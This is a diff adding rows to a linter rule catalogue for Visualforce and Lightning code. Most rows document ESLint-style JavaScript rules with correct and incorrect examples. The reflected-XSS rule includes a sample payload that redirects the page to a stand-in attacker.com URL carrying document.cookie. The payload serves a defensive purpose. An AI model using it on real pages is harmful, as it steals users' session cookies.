+    bar = 13;
+}
+
+function foo(bar) {
+    bar++;
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-param-reassign: ""error""*/
+
+function foo(bar) {
+    var baz = bar;
+}
+</code></pre>
+<h2 id=""options"">Options</h2>
+<p>This rule takes one option, an object, with a boolean property <code>""props""</code> and an array <code>""ignorePropertyModificationsFor""</code>. <code>""props""</code> is <code>false</code> by default. If <code>""props""</code> is set to <code>true</code>, this rule warns against the modification of parameter properties unless they're included in <code>""ignorePropertyModificationsFor""</code>, which is an empty array by default.</p>
+<h3 id=""props"">props</h3>
+<p>Examples of <strong>correct</strong> code for the default <code>{ ""props"": false }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-param-reassign: [""error"", { ""props"": false }]*/
+
+function foo(bar) {
+    bar.prop = ""value"";
+}
+
+function foo(bar) {
+    delete bar.aaa;
+}
+
+function foo(bar) {
+    bar.aaa++;
+}
+</code></pre>
+<p>Examples of <strong>incorrect</strong> code for the <code>{ ""props"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-param-reassign: [""error"", { ""props"": true }]*/
+
+function foo(bar) {
+    bar.prop = ""value"";
+}
+
+function foo(bar) {
+    delete bar.aaa;
+}
+
+function foo(bar) {
+    bar.aaa++;
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for the <code>{ ""props"": true }</code> option with <code>""ignorePropertyModificationsFor""</code> set:</p>
+<pre><code class=""js language-js"">/*eslint no-param-reassign: [""error"", { ""props"": true, ""ignorePropertyModificationsFor"": [""bar""] }]*/
+
+function foo(bar) {
+    bar.prop = ""value"";
+}
+
+function foo(bar) {
+    delete bar.aaa;
+}
+
+function foo(bar) {
+    bar.aaa++;
+}
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you want to allow assignment to function parameters, then you can safely disable this rule.</p>
+<h2 id=""furtherreading"">Further Reading</h2>
+<ul>
+<li><a href=""https://spin.atomicobject.com/2011/04/10/javascript-don-t-reassign-your-function-arguments/"">JavaScript: Donâ€™t Reassign Your Function Arguments</a></li>
+</ul>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:HeaderCheck,Files Should Have a Header Comment,"This rule verifies files have a comment matching a given regular expression before the very first tag.
+The header comment can be located before or after the <code>&lt;!DOCTYPE&gt;</code> declaration.
+    
+
+<p>For example, with the format <code>.*Copyright.*</code>, the following code:</p>
+
+<pre>
+&lt;html&gt;                                    //Bad: not recommended.
+...
+&lt;/html&gt;
+</pre>
+
+<p>should be refactored into:</p>
+
+<pre>
+&lt;!-- Copyright 2013 SonarSource SA --&gt;    //Good: preferred approach.
+&lt;html&gt;
+...
+&lt;/html&gt;
+</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:AvoidApexInScript,Avoid Apex Tags Within Script,"Avoid using &lt;apex:*&gt; tags within &lt;script&gt; tags. &lt;apex:&gt; tags should be avoided for the following reasons:<br/>
+<ul>
+	<li>The code is harder to read</li>
+	<li>CodeScan's javascript linter cannot parse the code properly</li> 
+	<li>&lt;apex:output&gt; cannot be controlled for security</li>
+</ul>  
+   <BR><h2>Example:</h2><pre>
+&lt;apex:page&gt;
+  &lt;script&gt;
+    &lt;apex:repeat value=""{! apexArray }"" var=""entry""&gt;      //Bad: Apex tag is used within Script to iterate through array.
+      document.write('{! JSENCODE(entry) }');
+    &lt;/apex:repeat&gt;
+  &lt;/script&gt;
+
+  &lt;script&gt;
+   var apexArray = JSON.parse('{! JSENCODE(apexArray) }');
+   if(Array.isArray(apexArray)) apexArray.forEach(function(entry){ document.write(entry) });  //Good: Iteration is provided without using Apex tags.
+  &lt;/script&gt;
+&lt;/apex:page&gt;
+</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:LongJavaScriptCheck,Avoid Large Javascript Scriptlets,"Javascript scriptlets should not have too many lines of code. Such long Javascript pieces of code should be located in dedicated *.js source files.
+    <BR><h2>Example:</h2><pre>
+   &lt;script type=""text/javascript""&gt;
+      Sfdc.onReady(function() {
+      var id = '{!$Component.myForm.myPageBlock.myField}';  //Bad: too many lines of javascript is not recommended.
+      var inputField = document.getElementById(id);
+      console.log(inputField.value);
+      //...
+      //...
+      //...
+    });
+  &lt;/script&gt;
+      
+      	
+      </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-func-assign,disallow reassigning `function` declarations,"<p>JavaScript functions can be written as a FunctionDeclaration <code>function foo() { ... }</code> or as a FunctionExpression <code>var foo = function() { ... };</code>. While a JavaScript interpreter might tolerate it, overwriting/reassigning a function written as a FunctionDeclaration is often indicative of a mistake or issue.</p>
+<pre><code class=""js language-js"">function foo() {}
+foo = bar;
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows reassigning <code>function</code> declarations.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-func-assign: ""error""*/
+
+function foo() {}
+foo = bar;
+
+function foo() {
+    foo = bar;
+}
+</code></pre>
+<p>Examples of <strong>incorrect</strong> code for this rule, unlike the corresponding rule in JSHint:</p>
+<pre><code class=""js language-js"">/*eslint no-func-assign: ""error""*/
+
+foo = bar;
+function foo() {}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-func-assign: ""error""*/
+
+var foo = function () {}
+foo = bar;
+
+function foo(foo) { // `foo` is shadowed.
+    foo = bar;
+}
+
+function foo() {
+    var foo = bar;  // `foo` is shadowed.
+}
+</code></pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-proto,disallow the use of the `__proto__` property,"<p><code>__proto__</code> property has been deprecated as of ECMAScript 3.1 and shouldn't be used in the code. Use <code>getPrototypeOf</code> method instead.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>When an object is created <code>__proto__</code> is set to the original prototype property of the objectâ€™s constructor function. <code>getPrototypeOf</code> is the preferred method of getting ""the prototype"".</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-proto: ""error""*/
+
+var a = obj.__proto__;
+
+var a = obj[""__proto__""];
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-proto: ""error""*/
+
+var a = Object.getPrototypeOf(obj);
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you need to support legacy browsers, you might want to turn this rule off, since support for <code>getPrototypeOf</code> is not yet universal.</p>
+<h2 id=""furtherreading"">Further Reading</h2>
+<ul>
+<li><a href=""http://ejohn.org/blog/objectgetprototypeof/"">Object.getPrototypeOf</a></li>
+</ul>",CRITICAL,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-extra-bind,disallow unnecessary calls to `.bind()`,"<p>The <code>bind()</code> method is used to create functions with specific <code>this</code> values and, optionally, binds arguments to specific values. When used to specify the value of <code>this</code>, it's important that the function actually use <code>this</code> in its function body. For example:</p>
+<pre><code class=""js language-js"">var boundGetName = (function getName() {
+    return this.name;
+}).bind({ name: ""ESLint"" });
+
+console.log(boundGetName());      // ""ESLint""
+</code></pre>
+<p>This code is an example of a good use of <code>bind()</code> for setting the value of <code>this</code>.</p>
+<p>Sometimes during the course of code maintenance, the <code>this</code> value is removed from the function body. In that case, you can end up with a call to <code>bind()</code> that doesn't accomplish anything:</p>
+<pre><code class=""js language-js"">// useless bind
+var boundGetName = (function getName() {
+    return ""ESLint"";
+}).bind({ name: ""ESLint"" });
+
+console.log(boundGetName());      // ""ESLint""
+</code></pre>
+<p>In this code, the reference to <code>this</code> has been removed but <code>bind()</code> is still used. In this case, the <code>bind()</code> is unnecessary overhead (and a performance hit) and can be safely removed.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule is aimed at avoiding the unnecessary use of <code>bind()</code> and as such will warn whenever an immediately-invoked function expression (IIFE) is using <code>bind()</code> and doesn't have an appropriate <code>this</code> value. This rule won't flag usage of <code>bind()</code> that includes function argument binding.</p>
+<p><strong>Note:</strong> Arrow functions can never have their <code>this</code> value set using <code>bind()</code>. This rule flags all uses of <code>bind()</code> with arrow functions as a problem</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-extra-bind: ""error""*/
+/*eslint-env es6*/
+
+var x = function () {
+    foo();
+}.bind(bar);
+
+var x = (() =&gt; {
+    foo();
+}).bind(bar);
+
+var x = (() =&gt; {
+    this.foo();
+}).bind(bar);
+
+var x = function () {
+    (function () {
+      this.foo();
+    }());
+}.bind(bar);
+
+var x = function () {
+    function foo() {
+      this.bar();
+    }
+}.bind(baz);
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-extra-bind: ""error""*/
+
+var x = function () {
+    this.foo();
+}.bind(bar);
+
+var x = function (a) {
+    return a + 1;
+}.bind(foo, bar);
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you are not concerned about unnecessary calls to <code>bind()</code>, you can safely disable this rule.</p>
+<h2 id=""furtherreading"">Further Reading</h2>
+<ul>
+<li><a href=""https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/bind"">Function.prototype.bind</a></li>
+<li><a href=""https://www.smashingmagazine.com/2014/01/understanding-javascript-function-prototype-bind/"">Understanding JavaScript's Function.prototype.bind</a></li>
+</ul>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-ex-assign,disallow reassigning exceptions in `catch` clauses,"<p>If a <code>catch</code> clause in a <code>try</code> statement accidentally (or purposely) assigns another value to the exception parameter, it impossible to refer to the error from that point on.
+Since there is no <code>arguments</code> object to offer alternative access to this data, assignment of the parameter is absolutely destructive.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows reassigning exceptions in <code>catch</code> clauses.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-ex-assign: ""error""*/
+
+try {
+    // code
+} catch (e) {
+    e = 10;
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-ex-assign: ""error""*/
+
+try {
+    // code
+} catch (e) {
+    var foo = 10;
+}
+</code></pre>
+<h2 id=""furtherreading"">Further Reading</h2>
+<ul>
+<li><a href=""https://bocoup.com/blog/the-catch-with-try-catch"">The ""catch"" with tryâ€¦catch</a> by Ben Alman explains how the exception identifier can leak into the outer scope in IE 6-8</li>
+</ul>",MAJOR,Visual Force & Lightning,BUG,FALSE
+cs-vf:no-control-regex,disallow control characters in regular expressions,"<p>Control characters are special, invisible characters in the ASCII range 0-31. These characters are rarely used in JavaScript strings so a regular expression containing these characters is most likely a mistake.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows control characters in regular expressions.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-control-regex: ""error""*/
+
+var pattern1 = /\x1f/;
+var pattern2 = new RegExp(""\x1f"");
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-control-regex: ""error""*/
+
+var pattern1 = /\x20/;
+var pattern2 = new RegExp(""\x20"");
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you need to use control character pattern matching, then you should turn this rule off.</p>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-undef,disallow the use of undeclared variables unless mentioned in `/*global */` comments,"<p>This rule can help you locate potential ReferenceErrors resulting from misspellings of variable and parameter names, or accidental implicit globals (for example, from forgetting the <code>var</code> keyword in a <code>for</code> loop initializer).</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>Any reference to an undeclared variable causes a warning, unless the variable is explicitly mentioned in a <code>/*global ...*/</code> comment, or specified in the <a href=""https://eslint.org/docs/user-guide/configuring#specifying-globals""><code>globals</code> key in the configuration file</a>. A common use case for these is if you intentionally use globals that are defined elsewhere (e.g. in a script sourced from HTML).</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-undef: ""error""*/
+
+var a = someFunction();
+b = 10;
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule with <code>global</code> declaration:</p>
+<pre><code class=""js language-js"">/*global someFunction b:true*/
+/*eslint no-undef: ""error""*/
+
+var a = someFunction();
+b = 10;
+</code></pre>
+<p>The <code>b:true</code> syntax in <code>/*global */</code> indicates that assignment to <code>b</code> is correct.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule with <code>global</code> declaration:</p>
+<pre><code class=""js language-js"">/*global b*/
+/*eslint no-undef: ""error""*/
+
+b = 10;
+</code></pre>
+<p>By default, variables declared in <code>/*global */</code> are read-only, therefore assignment is incorrect.</p>
+<h2 id=""options"">Options</h2>
+<ul>
+<li><code>typeof</code> set to true will warn for variables used inside typeof check (Default false).</li>
+</ul>
+<h3 id=""typeof"">typeof</h3>
+<p>Examples of <strong>correct</strong> code for the default <code>{ ""typeof"": false }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-undef: ""error""*/
+
+if (typeof UndefinedIdentifier === ""undefined"") {
+    // do something ...
+}
+</code></pre>
+<p>You can use this option if you want to prevent <code>typeof</code> check on a variable which has not been declared.</p>
+<p>Examples of <strong>incorrect</strong> code for the <code>{ ""typeof"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-undef: [""error"", { ""typeof"": true }] */
+
+if(typeof a === ""string""){}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for the <code>{ ""typeof"": true }</code> option with <code>global</code> declaration:</p>
+<pre><code class=""js language-js"">/*global a*/
+/*eslint no-undef: [""error"", { ""typeof"": true }] */
+
+if(typeof a === ""string""){}
+</code></pre>
+<h2 id=""environments"">Environments</h2>
+<p>For convenience, ESLint provides shortcuts that pre-define global variables exposed by popular libraries and runtime environments. This rule supports these environments, as listed in <a href=""../user-guide/configuring.md#specifying-environments"">Specifying Environments</a>.  A few examples are given below.</p>
+<h3 id=""browser"">browser</h3>
+<p>Examples of <strong>correct</strong> code for this rule with <code>browser</code> environment:</p>
+<pre><code class=""js language-js"">/*eslint no-undef: ""error""*/
+/*eslint-env browser*/
+
+setTimeout(function() {
+    alert(""Hello"");
+});
+</code></pre>
+<h3 id=""nodejs"">Node.js</h3>
+<p>Examples of <strong>correct</strong> code for this rule with <code>node</code> environment:</p>
+<pre><code class=""js language-js"">/*eslint no-undef: ""error""*/
+/*eslint-env node*/
+
+var fs = require(""fs"");
+module.exports = function() {
+    console.log(fs);
+};
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If explicit declaration of global variables is not to your taste.</p>
+<h2 id=""compatibility"">Compatibility</h2>
+<p>This rule provides compatibility with treatment of global variables in <a href=""http://jshint.com/"">JSHint</a> and <a href=""http://www.jslint.com"">JSLint</a>.</p>",MAJOR,Visual Force & Lightning,BUG,FALSE
+cs-vf:no-shadow-restricted-names,disallow identifiers from shadowing restricted names,"<p>ES5 Â§15.1.1 Value Properties of the Global Object (<code>NaN</code>, <code>Infinity</code>, <code>undefined</code>) as well as strict mode restricted identifiers <code>eval</code> and <code>arguments</code> are considered to be restricted names in JavaScript. Defining them to mean something else can have unintended consequences and confuse others reading the code. For example, there's nothing prevent you from writing:</p>
+<pre><code class=""js language-js"">var undefined = ""foo"";
+</code></pre>
+<p>Then any code used within the same scope would not get the global <code>undefined</code>, but rather the local version with a very different meaning.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-shadow-restricted-names: ""error""*/
+
+function NaN(){}
+
+!function(Infinity){};
+
+var undefined;
+
+try {} catch(eval){}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-shadow-restricted-names: ""error""*/
+
+var Object;
+
+function f(a, b){}
+</code></pre>
+<h2 id=""furtherreading"">Further Reading</h2>
+<ul>
+<li><a href=""https://es5.github.io/#x15.1.1"">Annotated ES5 - Â§15.1.1</a></li>
+<li><a href=""https://es5.github.io/#C"">Annotated ES5 - Annex C</a></li>
+</ul>",CRITICAL,Visual Force & Lightning,BUG,FALSE
+cs-vf:no-label-var,disallow labels that share a name with a variable,"<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule aims to create clearer code by disallowing the bad practice of creating a label that shares a name with a variable that is in scope.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-label-var: ""error""*/
+
+var x = foo;
+function bar() {
+x:
+  for (;;) {
+    break x;
+  }
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-label-var: ""error""*/
+
+// The variable that has the same name as the label is not in scope.
+
+function foo() {
+  var q = t;
+}
+
+function bar() {
+q:
+  for(;;) {
+    break q;
+  }
+}
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you don't want to be notified about usage of labels, then it's safe to disable this rule.</p>",MINOR,Visual Force & Lightning,BUG,FALSE
+cs-vf:no-invalid-regexp,disallow invalid regular expression strings in `RegExp` constructors,"<p>An invalid pattern in a regular expression literal is a <code>SyntaxError</code> when the code is parsed, but an invalid string in <code>RegExp</code> constructors throws a <code>SyntaxError</code> only when the code is executed.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows invalid regular expression strings in <code>RegExp</code> constructors.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-invalid-regexp: ""error""*/
+
+RegExp('[')
+
+RegExp('.', 'z')
+
+new RegExp('\\')
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-invalid-regexp: ""error""*/
+
+RegExp('.')
+
+new RegExp
+
+this.RegExp('[')
+</code></pre>
+<h2 id=""environments"">Environments</h2>
+<p>ECMAScript 6 adds the following flag arguments to the <code>RegExp</code> constructor:</p>
+<ul>
+<li><code>""u""</code> (<a href=""https://people.mozilla.org/~jorendorff/es6-draft.html#sec-get-regexp.prototype.unicode"">unicode</a>)</li>
+<li><code>""y""</code> (<a href=""https://people.mozilla.org/~jorendorff/es6-draft.html#sec-get-regexp.prototype.sticky"">sticky</a>)</li>
+</ul>
+<p>You can enable these to be recognized as valid by setting the ECMAScript version to 6 in your <a href=""../user-guide/configuring"">ESLint configuration</a>.</p>
+<p>If you want to allow additional constructor flags for any reason, you can specify them using an <code>allowConstructorFlags</code> option in <code>.eslintrc</code>. These flags will then be ignored by the rule regardless of the <code>ecmaVersion</code> setting.</p>
+<h2 id=""options"">Options</h2>
+<p>This rule has an object option for exceptions:</p>
+<ul>
+<li><code>""allowConstructorFlags""</code> is an array of flags</li>
+</ul>
+<h3 id=""allowconstructorflags"">allowConstructorFlags</h3>
+<p>Examples of <strong>correct</strong> code for this rule with the <code>{ ""allowConstructorFlags"": [""u"", ""y""] }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-invalid-regexp: [""error"", { ""allowConstructorFlags"": [""u"", ""y""] }]*/
+
+new RegExp('.', 'y')
+
+new RegExp('.', 'yu')
+</code></pre>
+<p>A list of valid flags for regular expressions is available <a href=""https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp"">here</a>.</p>
+<h2 id=""furtherreading"">Further Reading</h2>
+<ul>
+<li><a href=""https://es5.github.io/#x7.8.5"">Annotated ES5 Â§7.8.5 - Regular Expression Literals</a></li>
+</ul>",MINOR,Visual Force & Lightning,BUG,FALSE
+cs-vf:no-global-assign,disallow assignment to native objects,"<h1 id=""disallowassignmenttonativeobjectsorreadonlyglobalvariablesnoglobalassign"">Disallow assignment to native objects or read-only global variables (no-global-assign)</h1>
+<p>JavaScript environments contain a number of built-in global variables, such as <code>window</code> in browsers and <code>process</code> in Node.js. In almost all cases, you don't want to assign a value to these global variables as doing so could result in losing access to important functionality. For example, you probably don't want to do this in browser code:</p>
+<pre><code class=""js language-js"">window = {};
+</code></pre>
+<p>While examples such as <code>window</code> are obvious, there are often hundreds of built-in global objects provided by JavaScript environments. It can be hard to know if you're assigning to a global variable or not.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows modifications to read-only global variables.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-global-assign: ""error""*/
+
+Object = null
+undefined = 1
+</code></pre>
+<pre><code class=""js language-js"">/*eslint no-global-assign: ""error""*/
+/*eslint-env browser*/
+
+window = {}
+length = 1
+top = 1
+</code></pre>
+<pre><code class=""js language-js"">/*eslint no-global-assign: ""error""*/
+/*globals a:false*/
+
+a = 1
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-global-assign: ""error""*/
+
+a = 1
+var b = 1
+b = 2
+</code></pre>
+<pre><code class=""js language-js"">/*eslint no-global-assign: ""error""*/
+/*eslint-env browser*/
+
+onload = function() {}
+</code></pre>
+<pre><code class=""js language-js"">/*eslint no-global-assign: ""error""*/
+/*globals a:true*/
+
+a = 1
+</code></pre>
+<h2 id=""options"">Options</h2>
+<p>This rule accepts an <code>exceptions</code> option, which can be used to specify a list of builtins for which reassignments will be allowed:</p>
+<pre><code class=""json language-json"">{
+    ""rules"": {
+        ""no-global-assign"": [""error"", {""exceptions"": [""Object""]}]
+    }
+}
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you are trying to override one of the native objects.</p>",MAJOR,Visual Force & Lightning,BUG,FALSE
+vf:MouseEventWithoutKeyboardEquivalentCheck,Mouse Events should have Equivalent Keyboard Events,"Offering the same experience with the mouse and the keyboard allow users to pick their preferred device.
+Additionally, users of assistive technology will also be able to browse the site even if they cannot use the mouse.
+    
+
+<p>The following code:</p>
+
+<pre>
+&lt;a onClick=""doSomething();"" ...&gt;                                //Bad: 'onKeyPress' is missing.
+&lt;a onMouseover=""doSomething();"" ...&gt;                            //Bad: 'onFocus' is missing.
+&lt;a onMouseout=""doSomething();"" ...&gt;                             //Bad: 'onBlur' is missing.
+</pre>
+
+<p>should be refactored into:</p>
+
+<pre>
+&lt;a onClick=""doSomething();"" onKeyPress=""doSomething();"" ...&gt;    //Good: preferred approach.
+&lt;a onMouseover=""doSomething();"" onFocus=""doSomething();"" ...&gt;   //Good: preferred approach.
+&lt;a onMouseout=""doSomething();"" onBlur=""doSomething();"" ...&gt;     //Good: preferred approach.
+</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-extra-boolean-cast,disallow unnecessary boolean casts,"<p>In contexts such as an <code>if</code> statement's test where the result of the expression will already be coerced to a Boolean, casting to a Boolean via double negation (<code>!!</code>) or a <code>Boolean</code> call is unnecessary. For example, these <code>if</code> statements are equivalent:</p>
+<pre><code class=""js language-js"">if (!!foo) {
+    // ...
+}
+
+if (Boolean(foo)) {
+    // ...
+}
+
+if (foo) {
+    // ...
+}
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows unnecessary boolean casts.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-extra-boolean-cast: ""error""*/
+
+var foo = !!!bar;
+
+var foo = !!bar ? baz : bat;
+
+var foo = Boolean(!!bar);
+
+var foo = new Boolean(!!bar);
+
+if (!!foo) {
+    // ...
+}
+
+if (Boolean(foo)) {
+    // ...
+}
+
+while (!!foo) {
+    // ...
+}
+
+do {
+    // ...
+} while (Boolean(foo));
+
+for (; !!foo; ) {
+    // ...
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-extra-boolean-cast: ""error""*/
+
+var foo = !!bar;
+var foo = Boolean(bar);
+
+function foo() {
+    return !!bar;
+}
+
+var foo = bar ? !!baz : !!bat;
+</code></pre>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-obj-calls,disallow calling global object properties as functions,"<p>ECMAScript provides several global objects that are intended to be used as-is. Some of these objects look as if they could be constructors due their capitalization (such as <code>Math</code> and <code>JSON</code>) but will throw an error if you try to execute them as functions.</p>
+<p>The <a href=""https://es5.github.io/#x15.8"">ECMAScript 5 specification</a> makes it clear that both <code>Math</code> and <code>JSON</code> cannot be invoked:</p>
+<blockquote>
+  <p>The Math object does not have a <code>[[Call]]</code> internal property; it is not possible to invoke the Math object as a function.</p>
+</blockquote>
+<p>And the <a href=""https://www.ecma-international.org/ecma-262/6.0/index.html#sec-reflect-object"">ECMAScript 2015 specification</a> makes it clear that <code>Reflect</code> cannot be invoked:</p>
+<blockquote>
+  <p>The Reflect object also does not have a <code>[[Call]]</code> internal method; it is not possible to invoke the Reflect object as a function.</p>
+</blockquote>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows calling the <code>Math</code>, <code>JSON</code> and <code>Reflect</code> objects as functions.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-obj-calls: ""error""*/
+
+var math = Math();
+var json = JSON();
+var reflect = Reflect();
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-obj-calls: ""error""*/
+
+function area(r) {
+    return Math.PI * r * r;
+}
+var object = JSON.parse(""{}"");
+var value = Reflect.get({ x: 1, y: 2 }, ""x"");
+</code></pre>
+<h2 id=""furtherreading"">Further Reading</h2>
+<ul>
+<li><a href=""https://es5.github.io/#x15.8"">The Math Object</a></li>
+</ul>",MINOR,Visual Force & Lightning,BUG,FALSE
+cs-vf:no-unreachable,"disallow unreachable code after `return`, `throw`, `continue`, and `break` statements","<p>Because the <code>return</code>, <code>throw</code>, <code>break</code>, and <code>continue</code> statements unconditionally exit a block of code, any statements after them cannot be executed. Unreachable statements are usually a mistake.</p>
+<pre><code class=""js language-js"">function fn() {
+    x = 1;
+    return x;
+    x = 3; // this will never execute
+}
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows unreachable code after <code>return</code>, <code>throw</code>, <code>continue</code>, and <code>break</code> statements.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-unreachable: ""error""*/
+
+function foo() {
+    return true;
+    console.log(""done"");
+}
+
+function bar() {
+    throw new Error(""Oops!"");
+    console.log(""done"");
+}
+
+while(value) {
+    break;
+    console.log(""done"");
+}
+
+throw new Error(""Oops!"");
+console.log(""done"");
+
+function baz() {
+    if (Math.random() &lt; 0.5) {
+        return;
+    } else {
+        throw new Error();
+    }
+    console.log(""done"");
+}
+
+for (;;) {}
+console.log(""done"");
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule, because of JavaScript function and variable hoisting:</p>
+<pre><code class=""js language-js"">/*eslint no-unreachable: ""error""*/
+
+function foo() {
+    return bar();
+    function bar() {
+        return 1;
+    }
+}
+
+function bar() {
+    return x;
+    var x;
+}
+
+switch (foo) {
+    case 1:
+        break;
+        var x;
+}
+</code></pre>",MAJOR,Visual Force & Lightning,BUG,FALSE
+vf:HotspotGetSessionIdUsage,Using GETSESSIONID() and $API.Session_Id is security-sensitive,"The use of GETSESSIONID() and $API.Session_Id is security-sensitive. Ensure that you need to do this.
+
+<h2>See</h2>
+<ul>
+  <li> <a href=""http://cwe.mitre.org/data/definitions/807"">MITRE, CWE-807</a> - Reliance on Untrusted Inputs in a Security Decision </li>
+  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
+  <li> OWASP Top 10 2021 Category A7 - Identification and Authentication Failures  </li>
+</ul>",MAJOR,Visual Force & Lightning,SECURITY_HOTSPOT,FALSE
+vf:CrossSiteScriptingReflected,JavaScript Reflected XSS,"Reflected Cross-site Scripting (XSS) occur when an attacker injects browser executable code within a single HTTP response.<br/>
+    	<br/>
+    	<h2>See</h2>
+    	<ul>
+    	  <li> <a href=""https://developer.salesforce.com/docs/atlas.en-us.pages.meta/pages/pages_security_tips_xss.htm"">Cross Site Scripting (XSS)</a></li>
+		  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
+		  ('Eval Injection') </li>
+		  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
+		  ('Unsafe Reflection') </li>
+		  <li> OWASP Top 10 2021 Category A03 - Injection </li>
+		  
+		</ul>
+
+    <BR><h2>Example:</h2><pre>
+
+<script>var foo = '{!$CurrentPage.parameters.userparam}';</script>    //Bad: Javascript does not have built in protections.
+                                                                      
+// If userparam was given the value ""1';document.location='http://www.attacker.com/cgi-bin/cookie.cgi?'%2Bdocument.cookie;var%20foo='2""
+// all of the cookies for the current page would be sent to www.attacker.com.
+                                                                      
+
+
+    </pre>",MAJOR,Visual Force & Lightning,VULNERABILITY,FALSE
+vf:UnencodedStyle,Unencoded Formulas In Style Tags XSS,"Makes sure that all values obtained from URL parameters are properly escaped / sanitized to avoid XSS attacks.<br/>
+Input can be sanitized with JSENCODE().<br/>
+<br/>
+Using unescaped parameters can be a security risk.
+<h2>See</h2>
+<ul>
